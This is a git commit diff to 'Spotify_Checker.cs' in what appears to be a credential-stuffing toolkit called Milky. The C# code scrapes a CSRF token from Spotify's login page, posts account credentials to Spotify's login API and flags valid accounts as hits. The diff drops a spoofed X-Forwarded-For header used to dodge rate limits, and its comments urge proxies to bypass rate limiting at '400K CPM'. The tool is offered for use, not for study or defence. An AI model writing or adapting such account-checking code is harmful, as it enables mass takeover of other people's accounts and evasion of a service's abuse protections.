f93279064e644051a9a595257f9ce5fdcaa40853
Matt <33204743+Laiteux@users.noreply.github.com>
2020-01-30 23:15:01 +1100

    Update Spotify_Checker.cs

--- examples/Spotify_Checker.cs
+++ examples/Spotify_Checker.cs
@@ -12,8 +12,6 @@ namespace Milky.Examples
     public class Spotify_Checker
     {
         private static readonly HttpClient _httpClient = new HttpClient(new HttpClientHandler { UseCookies = false });
-        private static readonly Random _random = new Random();
-        private static readonly object _locker = new object();
 
         public static async Task Main()
         {
@@ -42,24 +40,14 @@ namespace Milky.Examples
                     var result = CheckResult.Unknown;
                     Dictionary<string, string> captures = null;
 
-                    string randomIp;
-
                     while (result == CheckResult.Unknown)
                     {
-                        lock (_locker)
-                        {
-                            randomIp = string.Join(".", _random.Next(1, 256), _random.Next(0, 256), _random.Next(0, 256), _random.Next(0, 256));
-                        }
-
                         try
                         {
-                            using var requestMessage1 = new HttpRequestMessage(HttpMethod.Get, "https://accounts.spotify.com/en/login");
-                            requestMessage1.Headers.TryAddWithoutValidation("X-Forwarded-For", randomIp);
-
-                            using var responseMessage1 = await _httpClient.SendAsync(requestMessage1);
+                            using var responseMessage1 = await _httpClient.GetAsync("https://accounts.spotify.com/en/login");
 
                             string csrfToken = Regex.Match(responseMessage1.Headers.ToString(), "csrf_token=(.*?);").Groups[1].Value; // Don't mind my way of parsing headers, it's a speed trick
-                            if (string.IsNullOrEmpty(csrfToken)) continue; // Use proxies if you want to bypass rate limit and reach up to 400K CPM
+                            if (csrfToken == string.Empty) continue; // Use proxies if you want to bypass rate limit and reach up to 400K CPM (yes sir)
 
                             using var requestMessage2 = new HttpRequestMessage(HttpMethod.Post, "https://accounts.spotify.com/api/login")
                             {
@@ -72,7 +60,6 @@ namespace Milky.Examples
                             };
 
                             requestMessage2.Headers.TryAddWithoutValidation("Cookie", string.Join(";", $"csrf_token={csrfToken}", "__bon=MHwwfDB8MHwxfDF8MXwx"));
-                            requestMessage2.Headers.TryAddWithoutValidation("X-Forwarded-For", randomIp);
                             requestMessage2.Headers.TryAddWithoutValidation("User-Agent", "Mozilla");
 
                             using var responseMessage2 = await _httpClient.SendAsync(requestMessage2);
@@ -88,7 +75,7 @@ namespace Milky.Examples
                                 result = CheckResult.Hit;
                             }
 
-                            // Missing capture, I'm too lazy to add it. If anyone wanna do so, feel free to submit a pull request.
+                            // Missing capture, will add later.
                         }
                         catch { }
                     }
